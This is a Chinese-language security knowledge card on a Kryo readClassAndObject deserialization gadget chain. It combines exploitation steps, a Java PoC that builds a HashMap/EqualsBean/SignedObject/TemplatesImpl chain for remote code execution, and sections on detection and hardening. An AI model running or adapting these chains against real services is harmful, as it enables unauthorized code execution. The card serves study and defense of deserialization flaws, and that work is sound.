---
id: web-java-deser-kryo-hashmap-hashcode-gadget-chain
title: Kryo readClassAndObject 反序列化：HashMap.put 触发 hashCode，链到 TemplatesImpl 与 Jackson XString
type: scenario
domain: web
path: web/java/deserialization
technique: kryo-readclassandobject-hashmap-hashcode-chain
aliases:
- Kryo 反序列化
- Kryo readClassAndObject
- Kryo HashMap put 链
- Kryo TemplatesImpl
- Kryo EqualsBean ToStringBean
- Kryo HotSwappableTargetSource
tags:
- java
- kryo
- deserialization
- gadget-chain
- hashmap
- templatesimpl
- signedobject
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V501
  verified_at: '2026-11-11T02:44:16+08:00'
  notes: 已对照原文与图07-11/16核对：/coffee/order 对 base64 后 Kryo readClassAndObject 反序列化、依赖含 jackson 2.13.2/rome 1.7.0/spring-aop 5.3.18/kryo 5.3.0、两条链（EqualsBean→ToStringBean→SignedObject/TemplatesImpl；HotSwappableTargetSource→XString→BaseJsonNode→TemplatesImpl）与结尾 flag 回显均一致；gadget 组件本身与既有 Rome/Jackson 卡同源，本卡新增点为 Kryo MapSerializer 反序列化 HashMap 时 map.put 触发 hashCode/equals 的入口，与 Hessian Map.put 入口卡并列成立。PoC 为文章结构整理，未在目标环境复跑。
---

## 一句话结论

Kryo 的 `readClassAndObject` 采用基于字段的对象重建，和 Hessian 类似；当序列化根对象是 `HashMap` 时，Kryo 在反序列化过程中会调用 `put`，从而触发键对象的 `hashCode()`/`equals()`——把已有的 hashCode gadget（`EqualsBean` → `ToStringBean` → `SignedObject`/`TemplatesImpl`，或 `HotSwappableTargetSource` → `XString`/`BaseJsonNode` → `TemplatesImpl`）套进 Kryo 流，即可在 `readClassAndObject` 阶段执行任意代码。

## 原理

- Kryo 是 Java 序列化框架，`readClassAndObject(Input)` 从流中读取类名并逐字段重建对象；它不依赖 Java 原生 `ObjectInputStream`，因此绕过常见的 `resolveClass` 黑名单。
- Kryo 的 `MapSerializer` 在反序列化 `HashMap` 时会逐个恢复键值并调用 `map.put(key, value)`；`HashMap.put` 会计算 key 的 `hashCode()`，必要时再调用 `equals()`。这是触发 gadget 的入口。
- **链一：CommonsBeanutils 风格**
  - `EqualsBean.hashCode()` 委托 `_beanClass` 指定的类调用 `_obj` 的 `hashCode`/`toString`；把 `_beanClass` 设为 `ToStringBean.class`、`_obj` 设为 `ToStringBean(Templates.class, templates)`。
  - `ToStringBean.toString()` 会对 `_obj` 的每个可读属性调用 getter；`TemplatesImpl.getOutputProperties()` 触发 `newTransformer()` → `defineClass` → `AbstractTranslet` 静态初始化 → 命令执行。
  - `SignedObject` 用于二次反序列化：`SignedObject.getObject()` 会反序列化内部 `HashMap`，再触发下一层 `EqualsBean` 链；两层嵌套可绕过某些黑名单/校验。
- **链二：Jackson/Spring AOP 风格**
  - `HotSwappableTargetSource.equals()` 调用其 `target` 的 `equals()`；把两个 `HotSwappableTargetSource` 的 target 分别设为 `POJONode`/`XString`（Jackson）与 `XString`，`XString.equals()` → `BaseJsonNode.toString()` → `TemplatesImpl.getOutputProperties()`。
- 依赖条件：目标 classpath 需有对应库（CommonsBeanutils/Jackson/Spring AOP/ROME 等），且 Kryo 允许反序列化这些类（见配置卡：`registrationRequired=false` 与 `StdInstantiatorStrategy` 往往需要先通过 setter 反射设置）。
- 为什么成立：Kryo 只是“重建对象”的工具，真正的危害来自重建过程中被调用的 `hashCode`/`equals`/`toString`/`getObject` 等虚方法；这与 Hessian/Jackson 等基于 getter/setter/hashCode 的链同源。

## 触发条件

- 应用在不可信输入上调用 `Kryo.readClassAndObject`/`readObject`（RPC、缓存、会话、消息队列等）。
- Kryo 的类注册/白名单不足以阻止 gadget 类（或攻击者可通过配置接口关闭 `registrationRequired`）。
- classpath 中存在可用 gadget 依赖（CommonsBeanutils、Jackson、Spring AOP、ROME 等）。
- 目标 JVM 允许 `TemplatesImpl` 定义字节码并执行静态初始化；命令执行受进程权限限制。

## 利用步骤

1. 确认入口：请求体 base64 解码后是 Kryo 流（类名/字段结构），接口调用 `readClassAndObject`。
2. 确认依赖：从错误回显/依赖泄露/源码确认 CommonsBeanutils、Jackson、Spring AOP、ROME 等是否存在。
3. 构造 TemplatesImpl：用 Javassist 生成继承 `AbstractTranslet` 的类，在静态初始化块中执行命令，设置 `_name`、`_class=null`、`_bytecodes`。
4. 构造链一：`ToStringBean(Templates.class, templates)` → `EqualsBean(String.class,"111")` 并反射设置 `_beanClass=ToStringBean.class`、`_obj=toStringBean` → 放入 `HashMap` 触发 `put` → `SignedObject(innerHashMap, DSA私钥)` → 外层 `ToStringBean(SignedObject.class, signedObject)` → 外层 `EqualsBean` → 外层 `HashMap`。
5. 用 `Kryo.writeClassAndObject(output, outerHashMap)` 序列化，base64 后提交；在本地同版本 Kryo/依赖环境先验证。
6. 若链一被依赖/黑名单阻断，改用链二（HotSwappableTargetSource/XString/BaseJsonNode）或其它 hashCode gadget。
7. 若报 `Class cannot be created (missing no-arg constructor)` 或 `Class is not registered`，先通过配置接口设置 `RegistrationRequired=false` 和 `StdInstantiatorStrategy`（见关联卡）。

## PoC

```java
// 链一结构（省略 setFieldValue/getTemplates 辅助方法）
TemplatesImpl templates = new TemplatesImpl();
setFieldValue(templates, "_name", "aiwin");
setFieldValue(templates, "_class", null);
setFieldValue(templates, "_bytecodes", new byte[][]{getTemplates()}); // AbstractTranslet 静态块执行命令

ToStringBean toStringBean = new ToStringBean(Templates.class, templates);
EqualsBean equalsBean = new EqualsBean(String.class, "111");
HashMap<Object,Object> inner = new HashMap<>();
inner.put(equalsBean, "aaa");
setFieldValue(equalsBean, "_beanClass", ToStringBean.class);
setFieldValue(equalsBean, "_obj", toStringBean);

KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
kpg.initialize(1024);
KeyPair kp = kpg.generateKeyPair();
SignedObject signedObject = new SignedObject(inner, kp.getPrivate(), Signature.getInstance("DSA"));

ToStringBean toStringBean1 = new ToStringBean(SignedObject.class, signedObject);
EqualsBean equalsBean1 = new EqualsBean(String.class, "aiwin");
HashMap<Object,Object> outer = new HashMap<>();
outer.put(equalsBean1, "bbb");
setFieldValue(equalsBean1, "_beanClass", ToStringBean.class);
setFieldValue(equalsBean1, "_obj", toStringBean1);

Kryo kryo = new Kryo();
Output output = new Output(new ByteArrayOutputStream());
kryo.writeClassAndObject(output, outer);
// base64(output.toBytes()) 作为请求体
```

说明：PoC 为文章链一的结构化整理，未在目标环境复跑；`getTemplates()` 需生成可执行的 `AbstractTranslet` 字节码，命令替换为无害验证命令。

## 变体与关联

- 变体：链二 `HotSwappableTargetSource` + `XString`/`BaseJsonNode`（Jackson）→ `TemplatesImpl`。
- 变体：其他在 `hashCode`/`equals`/`toString`/`getObject` 中触发危险方法的 gadget 都可套入 Kryo 的 `HashMap.put`。
- 关联：[[web-java-deser-kryo-setter-reflection-instantiator-registration-bypass]]（前置：关闭 registrationRequired、设置 StdInstantiatorStrategy）；[[web-java-deser-hessian-signedobject-second-order-templates]]（Hessian 下同源 SignedObject/TemplatesImpl 链）；[[web-java-deserialization-jackson-signedobject-getobject-short-chain]]（Jackson SignedObject 链）；[[web-java-deser-fastjson-xstring-hotswappable-tostring-waf-bypass]]（XString/HotSwappable 链）。
- 边界：Kryo 开启严格类注册、依赖缺失、`TemplatesImpl` 被黑名单/模块限制、命令执行被 RASP/沙箱阻断时失效。

## 检测与防御

- 修复：不要对不可信输入使用 Kryo 多态反序列化；必须使用时开启 `registrationRequired=true` 并使用严格类白名单（只允许业务 DTO），禁用 `TemplatesImpl`/`SignedObject`/`EqualsBean`/`HotSwappableTargetSource` 等 gadget 类。
- 加固：隔离反序列化进程/降低权限；移除不必要的 CommonsBeanutils/Jackson/Spring AOP 依赖或限制其可用类；启用 JVM 的模块/安全管理限制。
- 检测：Kryo 流中出现 `TemplatesImpl`、`SignedObject`、`EqualsBean`、`ToStringBean`、`HotSwappableTargetSource`、`XString`、`BaseJsonNode` 等类名；反序列化进程异常定义类/执行命令；请求体 base64 解码后出现 Kryo 类名结构。
- 响应：重启进程清除内存态影响，排查是否已写入内存马或持久化。
